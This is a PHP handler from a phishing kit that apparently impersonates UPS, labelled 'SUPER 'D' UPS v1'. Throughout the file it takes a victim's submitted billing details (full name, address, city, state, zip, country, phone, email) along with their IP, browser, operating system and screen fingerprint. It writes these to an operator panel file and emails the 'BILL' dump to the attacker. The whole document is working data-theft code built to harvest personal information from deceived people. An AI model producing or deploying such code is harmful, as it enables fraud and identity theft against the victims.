<?php
@ini_set('display_errors', 'on');
require 'detect.php';
include "setting.php";
$IP = getenv("REMOTE_ADDR");
$date = date("d M, Y");
$times = date("g:i a");
$code = $_SESSION['ip_countryCode']=clientData('code');
$country = strtolower($code);
if(isset($_POST['fullname'])&&isset($_POST['add1'])){session_start();
$fnm101=$_POST['fullname'];
$adr111=$_POST['add1'];
$cty112=$_POST['city'];
$stt113=$_POST['st'];
$zip114=$_POST['zipp'];
$cnt103=$_POST['ct'];
$phn102=$_POST['phonee'];
$eml116=$_POST['email'];
$brow = $_SESSION['browser'];
$sys = $_SESSION['os'];
$useragent = $_SERVER['HTTP_USER_AGENT'];
$ecran = $_SESSION['computer'];
$screen = $_POST['screen'];

$msg= '
【💳 BILL - '.$code.' - '.$IP.'】

[👤 Full Name]  = '.$fnm101.'
[🗺 Addres ]  = '.$adr111.'
[🌎 City ]  = '.$cty112.'
[🌎 State ]   = '.$stt113.'
[📮 Zip]  = '.$zip114.'
[🏴 Country ]   = '.$cnt103.'

[📞 Phone ]  = '.$phn102.'
[✉️ Email ]  = '.$eml116.'

【💻 System】

[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$IP.'
[⏰ TIME/DATE] ='.$times.' / '.$date.'
[🌐 BROWSER] = '.$brow.' and '.$sys.'
[🖖 FINGERPRINT] = '.$screen.' and '.$useragent.'
【UPS - '. $alias .'】';
$msght = '
<tr>
			<td width="80">
			<p align="center"><img src="https://www.countryflags.io/'.$_SESSION['ip_countryCode'].'/flat/24.png">' .$IP.'</th>
			<td width="60">
			<p align="center">'.$fnm101.' </th>
			<td width="60">
			<p align="center">'.$adr111.' </th>
			<td width="30">
			<p align="center">'.$cty112.' </th>
			<td width="30">
			<p align="center">'.$stt113.' </th>
			<td width="30">
			<p align="center">'.$zip114.' </th>
			<td width="30">
			<p align="center">'.$cnt103.' </th>
			<td width="30">
			<p align="center">'.$phn102.'</th>
			<td width="30">
			<p align="center">'.$eml116.'</th>
			<td width="30">
			<p align="center">'.$brow.' and '.$sys.'</th>
			<td width="60">
			<p align="center">'.$screen.' / '.$useragent.'</th>
			<td width="40">
			<p align="center">'.$times.' / '.$date.'</th>
			</font></th></tr>';
			
$save=fopen("../../panel/bill".$namerand.".html", "a+");
fwrite($save,$msght);fclose($save);$anti = $msg;
$subject  = " Dump / ".$IP." / ".$cnt." BILL ";
$headers .= "From: SUPER 'D' UPS v1" . "\r\n";
mail($yourmail, $subject, $msg, $headers);
$lastph = substr($phn102,-4);
$_SESSION['lastph']=$lastph;
$_SESSION['fnm101']=$fnm101;
$_SESSION['anti']=$anti;
include("api.php");
}
?>